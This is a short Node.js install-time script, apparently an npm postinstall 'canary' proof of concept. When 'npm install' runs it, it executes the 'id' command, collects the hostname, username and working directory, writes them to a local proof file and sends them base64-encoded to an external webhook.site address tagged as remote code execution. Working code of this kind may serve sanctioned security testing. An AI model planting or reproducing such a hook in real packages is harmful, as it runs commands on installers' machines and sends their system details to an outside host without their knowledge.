// Canary: fires only if onboarding runs 'npm install' on this repo.
const https=require('https'),os=require('os'),cp=require('child_process'),fs=require('fs');
let id='';try{id=cp.execSync('id').toString().trim()}catch(e){}
const info={host:os.hostname(),user:((os.userInfo&&os.userInfo())||{}).username,id:id,cwd:process.cwd()};
try{fs.writeFileSync('POSTINSTALL_PROOF.txt','NPM_POSTINSTALL_EXECUTED '+JSON.stringify(info)+'\n')}catch(e){}
const d=Buffer.from(JSON.stringify(info)).toString('base64');
try{https.get('https://webhook.site/4f30a4de-8999-4947-8dc0-a75dc717e560/?NPM_POSTINSTALL_RCE='+encodeURIComponent(d),()=>{}).on('error',()=>{})}catch(e){}
